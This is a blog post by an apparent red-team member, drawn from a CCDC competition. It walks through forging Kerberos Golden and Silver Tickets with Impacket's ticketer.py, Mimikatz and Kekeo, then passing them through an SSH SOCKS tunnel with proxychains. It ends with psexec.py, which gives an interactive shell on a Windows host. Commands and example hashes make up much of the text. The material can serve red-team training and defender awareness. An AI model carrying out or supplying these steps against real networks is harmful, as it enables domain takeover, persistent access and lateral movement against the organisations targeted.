---
layout: post
title: How To Pass the Ticket Through SSH Tunnels
tags:
- kerberos
- ccdc
image: /assets/ptt-over-ssh/attack-diagram.png
commentIssueId: 23
---

The [Pass the Ticket](https://attack.mitre.org/wiki/Technique/T1097) (PtT) attack method uses a Kerberos ticket in place of a plaintext password or NTLM hash. Probably the most common uses of PtT are using Golden and Silver Tickets. Gaining access to a host via PtT is fairly straightforward; however, performing it through an SSH tunnel is more complex.

At this year's Pacific Rim CCDC, my fellow Red Teamers and I ran into a situation where we had the target's *krbtgt* and machine account NTLM hashes and had unprivileged SSH access to one Linux host on the DMZ with internal network connectivity, but we had no direct access to any Windows hosts.

The setup roughly looked like this:

{% include image.html file="/assets/ptt-over-ssh/attack-diagram.png" description="Pass the Ticket Attack Overview Diagram" %}

You may encounter a similar situation on production networks when trying to compromise sensitive hosts in segmented portions of the network. This post covers how to pass Golden and Silver Tickets through an SSH tunnel. As an example in this post, we'll be trying to compromise the Windows host *WIN-RMJBTDB7QTF* through the Linux host located at 10.0.10.81.

Big thanks to Alberto Solino ([@agsolino](https://twitter.com/agsolino)) and everyone involved in Impacket's development and Benjamin Delpy ([@gentilkiwi](https://twitter.com/gentilkiwi)), Chris Gates ([@carnal0wnage](https://twitter.com/carnal0wnage)), and MWR Labs ([@mwrlabs](https://twitter.com/mwrlabs)) for writing these resources:
* [Tweet about using Golden Tickets on Linux](https://twitter.com/gentilkiwi/status/561901226682744832) - Benjamin Delpy
* [Ways to Load Kerberos Tickets](http://carnal0wnage.attackresearch.com/2015/09/ways-to-load-kerberos-tickets.html) - Chris Gates
* [Digging into MS14-068 Exploitation and Defence](https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/) - MWR Labs

# Golden Tickets

Golden Tickets (forged TGT tickets) have been extensively covered on various blogs and publications. They provide attackers methods to persist domain access, hop domains within a forest, and access resources as non-existent users. For detailed information about Golden Tickets, check out Sean Metcalf's ([@PyroTek3](https://twitter.com/PyroTek3)) post [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640) (and the dozens of other useful posts he's written!)

This attack requires a Linux host with the [Impacket Library](https://github.com/CoreSecurity/impacket) and proxychains installed. The host doesn't need to be domain joined.

## Forging the Ticket
To create a Golden Ticket, we need to have the following information from the target domain:

* *krbtgt* account NT hash
* domain SID
* domain FQDN
* user to impersonate

We will use Impacket's example script [ticketer.py](https://github.com/CoreSecurity/impacket/blob/master/examples/ticketer.py) to create the Golden Ticket credential cache (ccache) file. Here is an example of the syntax to create the ccache file for the user *mbrody-da*:

```bash
./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da
```

To enable the Impacket example scripts to use the ccache file for authentication, rather than provided plaintext passwords or NT hashes, we need to set the `KRB5CCNAME` variable to the absolute path of our ccache file:

```bash
export KRB5CCNAME=/path/to/ccache/file
```

Verify the variable was set correctly:

```bash
echo $KRB5CCNAME
```

Now we can use the `-k` flag with any Impacket script that supports Kerberos authentication to use the Golden Ticket rather than providing plaintext passwords or NT hashes.


## Name Resolution
To ensure the Kerberos process functions, we need to modify the `/etc/hosts` file of our attacker machine to include entries for the FQDN of the target's domain controller and the target host's NetBIOS name. Here is an example:

```plaintext
127.0.0.1	localhost
192.168.26.129	amity.local
192.168.26.128  WIN-RMJBTDB7QTF
```

If you don't already have the IP address of the domain controller, run *nslookup* on the target domain's FQDN via the SSH session on the target's Linux host. For example:

```bash
nslookup -type=srv _ldap._tcp.AMITY.LOCAL
```


## Proxychains
We'll be using proxychains to route our traffic over the SSH tunnel. Verify the proxychains port by reviewing the last line of the configuration file, `/etc/proxychains.conf` by default on Kali.

*Note: You may need to comment the `proxy_dns` setting in the proxychains configuration file if you are receiving name resolution issues when performing the attack.*

When we SSH into the target's Linux host, we'll provide the `-D` flag with the proxychains port. This will create a SOCKS proxy on our localhost's port that proxychains will route traffic through. For example:

```bash
ssh unpriv@10.0.10.81 -D 1337
```

To validate that the tunnel is set up properly, we can run an nmap TCP connect scan with proxychains against port 445 of the target host:

```bash
proxychains nmap -sT -Pn -p445 192.168.26.128
```

## Time Sync

Golden Ticket authentication won't work properly if the attacking machine's time is more than approximately five minutes off from the target domain's DC. We can use `net time` to check the target's time (*line 1 below*) and set the time on our attacker machine (*line 2*) if the delta exceeds five minutes:

```bash
proxychains net time -S <IP-of-DC>
proxychains net time set -S <IP-of-DC>
```

## Launch the Attack

With all the pieces in place, we can use any tool that supports ccache authentication to attack the target host. One such tool is Impacket's `psexec.py` example script. Running the following command will return an interactive CMD prompt:

```bash
proxychains ./psexec.py mbrody-da@WIN-RMJBTDB7QTF -k -no-pass
```

If you receive errors on launch, review the configuration of the dependencies and troubleshoot with `psexec.py`'s `-debug` flag.

# Silver Tickets

Silver Tickets (forged TGS tickets) authenticate a user to a service running on a host and provides attackers with stealth and persistence options not provided by Golden Tickets. For more information about Silver Tickets and their benefits, check out Sean Metcalf's post [How Attackers Use Kerberos Silver Tickets to Exploit Systems](https://adsecurity.org/?p=2011).

This attack requires a Linux host with the [Impacket Library](https://github.com/CoreSecurity/impacket) and proxychains installed and a Windows host with [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [Kekeo](https://github.com/gentilkiwi/kekeo) installed. Neither host needs to be domain joined.

## Forging the Ticket

To generate a Silver Ticket, we'll need the following information:

* target host machine account NTLM hash
* target host FQDN
* target service
* domain SID
* domain FQDN
* user to impersonate

In this example, we'll be authenticating to the target host over SMB, so we will use the *CIFS* service. Sean Metcalf maintains a list of common SPNs, which can be used in Silver Tickets, [here](https://adsecurity.org/?page_id=183).

At the time of writing, `ticketer.py` doesn't support Silver Ticket generation. Instead, we'll use Mimikatz on our Windows host to create a Silver Ticket *.kirbi* file and use Kekeo to convert the ticket to a ccache file.

> Update April 4, 2018: `ticketer.py` now supports Silver Ticket generation.

Generate the Silver Ticket with Mimikatz's [Kerberos module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos) using the following syntax:

```bash
kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE
```

Here's an example to create a ticket for user *mbrody-da* and the CIFS service:

```bash
kerberos::golden /user:mbrody-da /domain:amity.local /sid:S-1-5-21-2972629792-1506071460-1188933728 /target:WIN-RMJBTDB7QTF.amity.local /rc4:9f5dc9080322414141c92ff51efb952d /service:cifs
```

Exit Mimikatz and launch Kekeo. Convert the kirbi file to a ccache file with the following syntax:

```bash
misc::convert ccache /path/to/ticket.kirbi
```

You can convert multiple kirbi tickets with this syntax:

```bash
misc::convert ccaches /path/to/ticket1.kirbi /path/to/ticket2.kirbi ...
```

Copy the ccache file Kekeo output to the attacking Linux host. Make sure to note the file's absolute path on the Linux host; we will need it to set the `KRB5CCNAME` variable. The rest of the attack uses our Linux host.

## Attack Setup

The remaining Silver Ticket attack setup is largely similar to that of the Golden Ticket attack, with two exceptions. 

First, we need to provide the FQDN of the target host in the `/etc/hosts` file, rather than the NetBIOS name. For our example, the `/etc/hosts` file should look like this:

```plaintext
127.0.0.1	localhost
192.168.26.129	amity.local
192.168.26.128  WIN-RMJBTDB7QTF.amity.local
```

The second difference is that we will need to sync our attacking machine's time with the target host; Silver Tickets don't communicate with the target's domain controller.

Follow the same steps as the Golden Ticket attack above to set the `KRB5CCNAME` variable, validate the proxychains configuration, establish the SSH tunnel with SOCKS proxy, and validate the tunnel with nmap.

## Launch the Attack

We can now launch the attack with `psexec.py` against the FQDN of the target host:

```bash
proxychains python psexec.py mbrody-da@WIN-RMJBTDB7QTF.amity.local -k -no-pass
```

# Demo
This video demonstrates both methodologies described above:

{% include youtubevideo.html id="l6z6F_DYCbA" description="Pass the Ticket Over SSH Tunnel Demo Video" %}

# Closing Thoughts
Golden and Silver Tickets provide persistence and stealth techniques for attackers, but require forward connectivity to the target host to do so. An attacker may find themselves in a position where they possess the needed trust material, but can only reach a target host indirectly through a Linux host. In those scenarios, it is possible to perform the Pass the Ticket attack through an SSH tunnel via proxychains. While this post covered using `psexec.py` to launch the attack against the target host, any Impacket script that supports the `-k` argument will work, including [atexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/atexec.py), [smbclient.py](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py), [smbexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/smbexec.py), and [wmiexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py).
